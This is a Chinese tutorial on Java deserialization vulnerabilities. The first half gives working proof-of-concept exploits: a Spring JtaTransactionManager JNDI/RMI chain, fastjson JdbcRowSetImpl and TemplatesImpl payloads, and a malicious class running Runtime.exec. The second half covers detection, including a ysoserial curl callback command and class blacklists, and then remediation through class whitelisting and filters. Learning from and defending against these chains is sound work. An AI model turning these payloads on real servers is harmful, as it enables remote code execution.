这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的org.springframeworkl.transation.jta.JtaTransationManager类存在JDNI反序列化的问题，可以加载我们注册的RMI链接，然后将对象发送到有漏洞的服务器从而执行远程命令。

首先应当注意本文中成功执行的Poc本人仅在jdk1.7中测试成功，而jdk1.8中未测试成功。

## 什么是JNDI?

在这里的JNDI的利用方法在下面分析fastjson的反序列化漏洞时也会用到。

JNDI(Java Naming and Directory Interface)是J2EE中的重要规范之一，是一组在Java应用中访问命名和目录服务的API，使得我们能够通过名称去查询数据源从而访问需要的对象。

在这里我们给出在java下的一段提供JNDI服务的代码：

```java
System.out.println("Starting HTTP server");
HttpServer httpServer = HttpServer.create(new InetSocketAddress(8086), 0);
httpServer.createContext("/",new HttpFileHandler());
httpServer.setExecutor(null);
httpServer.start();

System.out.println("Creating RMI Registry");
Registry registry = LocateRegistry.createRegistry(1099);
Reference reference = new javax.naming.Reference("ExportObject","ExportObject","http://127.0.01:8086/");
ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
registry.bind("Object", referenceWrapper);
```

这里我们创建了一个HTTP服务后又创建了一个RMI服务,并且RMI服务提供了对ExportObject类的查询，这里ExportObject类的源码为：

```java
public class ExportObject {
    public ExportObject() {
        try {
            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
```

其功能便是执行我们验证rce时常用的调用计算器的功能。

要加载ExportObject类我们可以使用以下的代码:

```java
Context ctx=new InitialContext();
ctx.lookup("rmi://127.0.0.1:1099/Object");
//System.out.println("loaded obj");
```

执行以下代码后可以发现ExportObject类的构造函数被调用，弹出了计算器。

## Spring框架中的JNDI反序列化漏洞

导致JNDI反序列化问题的类主要是 `org.springframework.transaction.jta.JtaTransactionManager` 类。

跟进该类的源码中的readObject()函数:

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ois.defaultReadObject();
    this.jndiTemplate = new JndiTemplate();
    this.initUserTransactionAndTransactionManager();
    this.initTransactionSynchronizationRegistry();
}
```

继续跟进initUserTransactionAndTransactionManager()函数

```java

protected void initUserTransactionAndTransactionManager() throws TransactionSystemException {
if (this.userTransaction == null) {
    if (StringUtils.hasLength(this.userTransactionName)) {
        this.userTransaction = this.lookupUserTransaction(this.userTransactionName);
        this.userTransactionObtainedFromJndi = true;
    } else {
        this.userTransaction = this.retrieveUserTransaction();
        if (this.userTransaction == null && this.autodetectUserTransaction) {
            this.userTransaction = this.findUserTransaction();
        }
    }
}
```

继续进一步跟进lookupUserTransaction()函数

```java
protected UserTransaction lookupUserTransaction(String userTransactionName) throws TransactionSystemException {
    try {
        if (this.logger.isDebugEnabled()) {
            this.logger.debug("Retrieving JTA UserTransaction from JNDI location [" + userTransactionName + "]");
        }

        return (UserTransaction)this.getJndiTemplate().lookup(userTransactionName, UserTransaction.class);
    } catch (NamingException var3) {
        throw new TransactionSystemException("JTA UserTransaction is not available at JNDI location [" + userTransactionName + "]", var3);
    }
}
```

可以看到最终return (UserTransaction)this.getJndiTemplate().lookup(userTransactionName, UserTransaction.class),跟进JndiTemplate类的lookup方法,

```java
public Object lookup(final String name) throws NamingException {
    if (this.logger.isDebugEnabled()) {
        this.logger.debug("Looking up JNDI object with name [" + name + "]");
    }

    return this.execute(new JndiCallback<Object>() {
        public Object doInContext(Context ctx) throws NamingException {
            Object located = ctx.lookup(name);
            if (located == null) {
                throw new NameNotFoundException("JNDI object with [" + name + "] not found: JNDI implementation returned null");
            } else {
                return located;
            }
        }
    });
}
```

而execute()方法的定义如下

```java
public <T> T execute(JndiCallback<T> contextCallback) throws NamingException {
    Context ctx = this.getContext();
    Object var3;
    try {
        var3 = contextCallback.doInContext(ctx);//此处触发RCE
    } finally {
        this.releaseContext(ctx);
    }
    return var3;
}
```

可以看到在整个流程的最后将会查询最开始我们由反序列化传入的org.springframework.transaction.jta.JtaTransactionManager类的对象的userTransactionName属性，最终导致加载了我们恶意的rmi源中的恶意类，从而导致RCE。

## Poc

这个漏洞的Poc构造比起之前分析的apache common collections反序列化的Poc构造显然要简单许多：

```java
System.out.println("Connecting to server "+serverAddress+":"+port);
Socket socket=new Socket(serverAddress,port);
System.out.println("Connected to server");
String jndiAddress = "rmi://127.0.0.1:1099/Object";//恶意的rmi注册源

org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();
object.setUserTransactionName(jndiAddress);

System.out.println("Sending object to server...");
ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
objectOutputStream.writeObject(object);
objectOutputStream.flush();
```

# fastjson反序列化漏洞

与上面的利用链不同，之前我们介绍到的利用链都是由readObject()方法触发，而在fastjson的反序列化中我们触发漏洞则是利用了目标类的setXXX()方法和getXXX()方法，因为这两个方法是fastjson在完成反序列化时需要调用的方法。

关于fastjson的反序列化我测试了两种不同的利用链，分别为JdbcRowSetImpl与TemplatesImpl.前者正如同之前测试的spring jndi反序列化漏洞，使用了JNDI这一java特性来实现RCE；而后者则使用了另一套不同的机制。

这里给出两种利用链的分析。

## JdbcRowSetImpl

利用JdbcRowSetImpl时使用的payload主要如下:

```json
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"rmi://127.0.0.1:3456/Object",
    "autoCommit":true
}
```

在触发反序列化时会调用JdbcRowSetImpl类的 setAutoCommit函数

```java
public void setAutoCommit(boolean var1) throws SQLException {
        if (this.conn != null) {
            this.conn.setAutoCommit(var1);
        } else {
            this.conn = this.connect();
            this.conn.setAutoCommit(var1);
        }
}
```

继续跟进connect函数

```java
protected Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
```

可以看到当conn为null时会发起JNDI查询从而加载我们的恶意类,这条利用链也是很简单的一条利用链，其缺陷也很明显，在jdk版本1.8时无法直接使用。

## TemplatesImpl

payload如下:

```json
{    "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes":["base64编码后的继承于AbstractTranslet类的子类的class文件"],
    '_name':'a.b',
    '_tfactory':{ },
    "_outputProperties":{ },
    "_version":"1.0",
    "allowedProtocols":"all"
}
```

由于 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 类的outputProperties属性类型为Properties因此在反序列化过程中会调用该类的getOutputProperties方法。
 

```java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```

继续跟进newTransformer方法

```java
public synchronized Transformer newTransformer()
    throws TransformerConfigurationException {
    TransformerImpl transformer;
    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
        _indentNumber, _tfactory);//this line
    if (_uriResolver != null) {
        transformer.setURIResolver(_uriResolver);
    }
    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
        transformer.setSecureProcessing(true);
    }
    return transformer;
}
```

在newTransformer方法中需要实例化一个TransformerImpl类的对象，跟进getTransletInstance()方法

```java
private Translet getTransletInstance()
    throws TransformerConfigurationException {
    try {
        if (_name == null) return null;
        if (_class == null) defineTransletClasses();
        // The translet needs to keep a reference to all its auxiliary
        // class to prevent the GC from collecting them
        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
        translet.postInitialization();
        translet.setTemplates(this);
        translet.setServicesMechnism(_useServicesMechanism);
        translet.setAllowedProtocols(_accessExternalStylesheet);
        if (_auxClasses != null) {
            translet.setAuxiliaryClasses(_auxClasses);
        }
        return translet;
    }
    catch (InstantiationException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (IllegalAccessException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

跟进defineTransletClasses方法中

```java
private void defineTransletClasses()
    throws TransformerConfigurationException {
    if (_bytecodes == null) {
        //...
    }
    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
            }
        });
    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];
        if (classCount > 1) {
            _auxClasses = new Hashtable();
        }
        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]);
            final Class superClass = _class[i].getSuperclass();
            // Check if this is the main class
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }
        if (_transletIndex < 0) {
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    } catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    } catch (LinkageError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

可以看到该方法将会遍历我们传入的_bytecodes数组，执行loader.defineClass方法，而TransletClassLoader类的defineClass方法如下:

```java
Class defineClass(final byte[] b) {
    return defineClass(null, b, 0, b.length);
}
```

可以看到该方法会将我们传入的编码后的class文件加载入jvm。

而我们的恶意类继承于ABSTRACT_TRANSLET，即com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，因此便会设置_transletIndex为0。

再回到我们的getTransletInstance方法中，

```java
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
```

生成了一个我们的恶意类的对象实例，因此导致了我们的恶意类中的代码最后被执行。

这里我们使用的恶意类如下:

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class ShellExec extends AbstractTranslet{
    public ShellExec() throws IOException{
        Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }

    public static void main(String[] args) throws Exception {
        //ShellExec t = new ShellExec();
    }

}
```

当fastjson反序列化执行我们的payload时便可以触发构造方法中的操作从而导致RCE。

# 反序列化漏洞检测方案

## 代码审计

反序列化操作一般在导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘或DB存储等业务场景,在代码审计时可重点关注一些反序列化操作函数并判断输入是否可控，如下：

```
ObjectInputStream.readObject
ObjectInputStream.readUnshared
XMLDecoder.readObject
Yaml.load
XStream.fromXML
ObjectMapper.readValue
JSON.parseObject
```

...同时也要关注第三jar包是否提供了一些公共的反序列化操作接口，如果没有相应的安全校验如白名单校验方案，且输入可控的话就也可能存在安全问题。

## 进阶审计

对于直接获取用户输入进行反序列化操作这种点比较好审计并发现，目前反序列化漏洞已经被谈起太多次了，所以有经验的开发都会在代码中有相应的修复。

但并不是所有修复都无懈可击。

比如采用黑名单校验的修复方式，对于这种修复可在工程代码中尝试挖掘新的可以利用的’gadget‘。

代码中有使用到反序列化操作，那自身项目工程中肯定存在可以被反序列化的类，包括Java自身、第三方库有大量这样的类，可被反序列化的类有一个特点，就是该类必定实现了Serializable接口，Serializable 接口是启用其序列化功能的接口，实现 java.io.Serializable 接口的类才是可序列化的。

一个典型的示例如下：

```java
public class SerialObject implements Serializable{
    private static final long serialVersionUID = 5754104541168322017L;

    private int id;
    public String name;

    public SerialObject(int id,String name){
        this.id=id;
        this.name=name;
    }

    public void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        //执行默认的readObject()方法
        in.defaultReadObject();
    }
}
```

所以在代码审计时对这些类也可进行特别关注，分析并确认是否有可能被发序列化漏洞利用执行任意代码。

发现新的可利用的类即可突破使用黑名单进行校验的一些应用。

## 白盒检测

大型企业的应用很多，每个都人工去审计不现实，往往都有相应的自动化静态代码审计工具，这里以ObjectInputStream.readObject()为例，其它反序列化接口的检测原理也相似。

在自动化检测时，可通过实现解析java源代码，检测readObject()方法调用时判断其对象是否为java.io.ObjectOutputStream。

如果此时ObjectInputStream对象的初始化参数来自外部请求输入参数则基本可以确定存在反序列化漏洞了。

这是只需确认是否存在相应的安全修复即可。

可参考lgtm.com对于Deserialization of user-controlled data检测方式的实现。

## 黑盒检测

调用ysoserial并依次生成各个第三方库的利用payload(也可以先分析依赖第三方包量，调用最多的几个库的paylaod即可)，该payload构造为访问特定url链接的payload，根据http访问请求记录判断反序列化漏洞是否利用成功。

如：

```
java -jar ysoserial.jar CommonsCollections1 'curl " + URL + " '
```

也可通过DNS解析记录确定漏洞是否存在。

现成的轮子很多，推荐NickstaDB写的SerialBrute，还有一个针对RMI的测试工具BaRMIe，也很不错～。

## RASP检测J

ava程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。

类的名称及serialVersionUID的ObjectStreamClass描述符在序列化对象流的前面位置，且在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以RASP检测反序列化漏洞时可通过重写ObjectInputStream对象的resolveClass方法获取反序列化的类即可实现对反序列化类的黑名单校验。

百度的开源RASP产品就是使用的这种方法，具体可参考其DeserializationHook.java的实现:

```java
作者：Cryin
链接：https://www.zhihu.com/question/37562657/answer/327040570
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

@Override
protected MethodVisitor hookMethod(int access, String name, String desc,
                                   String signature, String[] exceptions, MethodVisitor mv) {
    if ("resolveClass".equals(name) && "(Ljava/io/ObjectStreamClass;)Ljava/lang/Class;".equals(desc)) {
        return new AdviceAdapter(Opcodes.ASM5, mv, access, name, desc) {
            @Override
            protected void onMethodEnter() {
                loadArg(0);
                invokeStatic(Type.getType(HookHandler.class),
                        new Method("checkDeserializationClass", "(Ljava/io/ObjectStreamClass;)V"));
            }
        };
    }
    return mv;
}
```

其中检测覆盖的反序列化类黑名单如下:

```java
plugin.register('deserialization', function (params, context) {
    var deserializationInvalidClazz = [
        'org.apache.commons.collections.functors.InvokerTransformer',
        'org.apache.commons.collections.functors.InstantiateTransformer',
        'org.apache.commons.collections4.functors.InvokerTransformer',
        'org.apache.commons.collections4.functors.InstantiateTransformer',
        'org.codehaus.groovy.runtime.ConvertedClosure',
        'org.codehaus.groovy.runtime.MethodClosure',
        'org.springframework.beans.factory.ObjectFactory',
        'xalan.internal.xsltc.trax.TemplatesImpl'
    ]

    var clazz = params.clazz
    for (var index in deserializationInvalidClazz) {
        if (clazz === deserializationInvalidClazz[index]) {
            return {
                action:     'block',
                message:    '尝试反序列化攻击',
                confidence: 100
            }
        }
    }
    return clean
})
```

## 攻击检测

通过查看反序列化后的数据，可以看到反序列化数据开头包含两字节的魔术数字，这两个字节始终为十六进制的 `0xAC ED`。

接下来是两字节的版本号。

我只见到过版本号为5（0x00 05）的数据。

考虑到zip、base64各种编码，在攻击检测时可针对该特征进行匹配请求post中是否包含反序列化数据，判断是否为反序列化漏洞攻击。

```
xxxdeMacBook-Pro:demo xxx$ xxd objectexp 
	00000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
	00000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
	00000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
	00000030: 696f 6e48 616e 646c 6572 55ca f50f 15cb  ionHandlerU.....
```

但仅从特征匹配只能确定有攻击尝试请求，还不能确定就存在反序列化漏洞，还要结合请求响应、返回内容等综合判断是否确实存在漏洞。

# Java反序列化漏洞修复方案

## 通过Hook resolveClass来校验反序列化的类

通过上面序列化数据结构可以了解到包含了类的名称及serialVersionUID的ObjectStreamClass描述符在序列化对象流的前面位置，且在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。

这个方法最早是由IBM的研究人员Pierre Ernst在2013年提出 [《Look-ahead Java deserialization》](https://www.ibm.com/developerworks/library/se-lookahead/)，具体实现代码示例如下:

```java
public class AntObjectInputStream extends ObjectInputStream{
    public AntObjectInputStream(InputStream inputStream)
            throws IOException {
        super(inputStream);
    }

    /**
     * 只允许反序列化SerialObject class
     */
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException,
            ClassNotFoundException {
        if (!desc.getName().equals(SerialObject.class.getName())) {
            throw new InvalidClassException(
                    "Unauthorized deserialization attempt",
                    desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```


通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。

但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。

SerialKiller 是由Luca Carettoni利用上面介绍的方法实现的反序列化类白/黑名单校验的jar包。

具体使用方法可参考其代码仓库。contrast-rO0是一个轻量级的agent程序，通过通过重写ObjectInputStream来防御反序列化漏洞攻击。

使用其中的SafeObjectInputStream类来实现反序列化类白/黑名单控制，示例代码如下:

```java
SafeObjectInputStream in = new SafeObjectInputStream(inputStream, true);
in.addToWhitelist(SerialObject.class);

in.readObject();
```

## 使用ValidatingObjectInputStream来校验反序列化的类

使用Apache Commons IO Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白/黑名单控制，具体可参考ValidatingObjectInputStream介绍；示例代码如下:

```java
private static Object deserialize(byte[] buffer) throws IOException,
ClassNotFoundException , ConfigurationException {
  Object obj;
  ByteArrayInputStream bais = new ByteArrayInputStream(buffer);
  // Use ValidatingObjectInputStream instead of InputStream
  ValidatingObjectInputStream ois = new   ValidatingObjectInputStream(bais); 

  //只允许反序列化SerialObject class
  ois.accept(SerialObject.class);
  obj = ois.readObject();
  return obj;
}
```

## 使用ObjectInputFilter来校验反序列化的类

Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承java.io.ObjectInputFilter类重写checkInput方法实现自定义的过滤器，并使用ObjectInputStream对象的setObjectInputFilter设置过滤器来实现反序列化类白/黑名单控制。

示例代码如下:

```java
import java.util.List;
import java.util.Optional;
import java.util.function.Function;
import java.io.ObjectInputFilter;
class BikeFilter implements ObjectInputFilter {
  private long maxStreamBytes = 78; // Maximum allowed bytes in the stream.
  private long maxDepth = 1; // Maximum depth of the graph allowed.
  private long maxReferences = 1; // Maximum number of references in a graph.
  @Override
  public Status checkInput(FilterInfo filterInfo) {
    if (filterInfo.references() < 0 || filterInfo.depth() < 0 || filterInfo.streamBytes() < 0 || filterInfo.references() > maxReferences || filterInfo.depth() > maxDepth|| filterInfo.streamBytes() > maxStreamBytes) {
      return Status.REJECTED;
    }
    Class<?> clazz = filterInfo.serialClass();
    if (clazz != null) {
      if (SerialObject.class == filterInfo.serialClass()) {
        return Status.ALLOWED;
      }
      else {
        return Status.REJECTED;
      }
    }
    return Status.UNDECIDED;
  } // end checkInput
} // end class BikeFilter
```

上述示例代码，仅允许反序列化SerialObject类对象，上述示例及更多关于ObjectInputFilter的均参考自NCC Group Whitepaper由Robert C. Seacord写的

[《Combating Java DeserializationVulnerabilities with Look-Ahead ObjectInput Streams (LAOIS)》](https://link.zhihu.com/?target=https%3A//www.nccgroup.trust/globalassets/our-research/us/whitepapers/2017/june/ncc_group_combating_java_deserialization_vulnerabilities_with_look-ahead_object_input_streams1.pdf)

## 黑名单校验修复

在反序列化时设置类的黑名单来防御反序列化漏洞利用及攻击，这个做法在源代码修复的时候并不是推荐的方法，因为你不能保证能覆盖所有可能的类，而且有新的利用payload出来时也需要随之更新黑名单。

但有某些场景下可能又不得不选择黑名单方案。

写代码的时候总会把一些经常用到的方法封装到公共类，这样其它工程中用到只需要导入jar包即可，此前已经见到很多提供反序列化操作的公共接口，使用第三方库反序列化接口就不好用白名单的方式来修复了。

这个时候作为第三方库也不知道谁会调用接口，会反序列化什么类，所以这个时候可以使用黑名单的方式来禁止一些已知危险的类被反序列化，部分的黑名单类如下：

```
org.apache.commons.collections.functors.InvokerTransformer
org.apache.commons.collections.functors.InstantiateTransformer
org.apache.commons.collections4.functors.InvokerTransformer
org.apache.commons.collections4.functors.InstantiateTransformer
org.codehaus.groovy.runtime.ConvertedClosure
org.codehaus.groovy.runtime.MethodClosure
org.springframework.beans.factory.ObjectFactory
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
org.apache.commons.fileupload
org.apache.commons.beanutils
...
```

## 安全编码建议

更新commons-collections、commons-io等第三方库版本；

业务需要使用反序列化时，尽量避免反序列化数据可被用户控制，如无法避免建议尽量使用白名单校验的修复方式；

# 后记

这里分析的几条反序列化的利用链属于分析难度不算特别大的反序列化利用链，便于我们入门java反序列化漏洞。

相关的测试代码已经放到了github上,大家可以clone该项目下断点测试.另外最近在jdk1.8下对于JNDI限制的绕过后来阅读了一些大佬的博客(https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html) 得知存在绕过限制的方法，大家也可以去测试一下。

# 拓展阅读  

[web 安全系列](https://houbb.github.io/2020/08/09/web-safe-00-overview)

# 参考资料

[Java反序列化漏洞的一些利用链分析](https://www.anquanke.com/post/id/173459#h2-1)

[Java反序列化漏洞辅助工具之gadgetinspector](http://rk700.github.io/2019/11/29/gadgetinspector/)

[JAVA反序列化漏洞完整过程分析与调试](https://wooyun.js.org/drops/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95.html)

[Java反序列化安全漏洞怎么回事?](https://www.zhihu.com/question/37562657)

[Java反序列化漏洞的原理分析](https://www.freebuf.com/vuls/170344.html)

[深入理解 JAVA 反序列化漏洞](https://paper.seebug.org/312/#4)

[Java反序列化漏洞原理解析](https://xz.aliyun.com/t/6787#toc-11)

* any list
{:toc}